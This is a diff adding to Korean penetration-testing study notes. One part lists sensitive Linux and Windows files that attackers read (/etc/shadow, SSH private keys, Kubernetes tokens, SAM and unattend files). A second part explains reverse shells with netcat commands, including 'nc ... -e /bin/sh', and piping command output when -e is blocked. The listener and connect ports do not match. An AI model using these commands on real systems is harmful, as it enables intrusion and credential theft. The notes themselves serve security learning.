@@ -11,6 +11,60 @@
 	rpm -qa			특정 패키지 정보 확인
 	cat /proc/cpuinfo		cpu 정보 확인
 	cat /proc/version		kernel 버전 확인
+
+	그 외 
+		/etc/issue
+		/etc/passwd
+		/etc/shadow
+		/etc/group
+		/etc/hosts
+		/etc/motd
+		/etc/mysql/my.cnf
+		/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+		/proc/self/environ
+		/proc/version
+		/proc/cmdline
+		/proc/sched_debug
+		/proc/mounts
+		/proc/net/arp
+		/proc/net/route
+		/proc/net/tcp
+		/proc/net/udp
+		/proc/self/cwd/index.php
+		/proc/self/cwd/main.py
+		/home/$USER/.bash_history
+		/home/$USER/.ssh/id_rsa
+		/run/secrets/kubernetes.io/serviceaccount/token
+		/run/secrets/kubernetes.io/serviceaccount/namespace
+		/run/secrets/kubernetes.io/serviceaccount/certificate
+		/var/run/secrets/kubernetes.io/serviceaccount
+		/var/lib/mlocate/mlocate.db
+		/var/lib/mlocate.db
+
+		c:\windows\system32\license.rtf
+		c:\windows\system32\eula.txt
+		c:/boot.ini
+		c:/inetpub/logs/logfiles
+		c:/inetpub/wwwroot/global.asa
+		c:/inetpub/wwwroot/index.asp
+		c:/inetpub/wwwroot/web.config
+		c:/sysprep.inf
+		c:/sysprep.xml
+		c:/sysprep/sysprep.inf
+		c:/sysprep/sysprep.xml
+		c:/system32/inetsrv/metabase.xml
+		c:/sysprep.inf
+		c:/sysprep.xml
+		c:/sysprep/sysprep.inf
+		c:/sysprep/sysprep.xml
+		c:/system volume information/wpsettings.dat
+		c:/system32/inetsrv/metabase.xml
+		c:/unattend.txt
+		c:/unattend.xml
+		c:/unattended.txt
+		c:/unattended.xml
+		c:/windows/repair/sam
+		c:/windows/repair/system
 	
 	
 ***매세지 보내기***
@@ -154,3 +208,29 @@
 	
 	추가옵션으로 -t 가 있는데 이는 스레드를 조절해 더 빠른 탐색을 도와 준다.
 	일반적으로 대략 60~100개 정도면 적당하다고 한다.
+
+
+
+***리버스쉘***
+	일반적인 쉘은 공격자가 클라이언트고 피해자가 서버라고 한다면,
+	리버스쉘은 반대로 공격자가 서버를 열고 피해자가 오게끔하고,
+	실제로 쉘은 공격자가 사용하는 방식이다.
+
+	nc
+		리버스쉘 이전에 nc으로 리버스 쉘과 유사한 기능을 만들 수 있다.
+
+		공격자는 nc으로 열려있는 포트를 listen 모드 상태로 만든다
+		l은 listen모드
+		v는 verbosity를 증가 시킴(더 많은 정보를 얻을 수 있음)
+		p는 local port 지정
+
+			nc -lvp 1346
+
+		피해자 서버에서는 아래와 같이 쉘을 열 수 있다.
+
+			nc 127.0.0.1 7777 -e /bin/sh
+
+		그러나 요즘에는 e옵션을 막아놔서 nc을 다운그래이드 하거나 다른 방법을 찾아야하는데
+		www-data같은 권한으로 nc다운그래이드는 힘드므로 다음가 같은 차선책이 있다.
+
+			ls -al | nc 127.0.0.1 7777
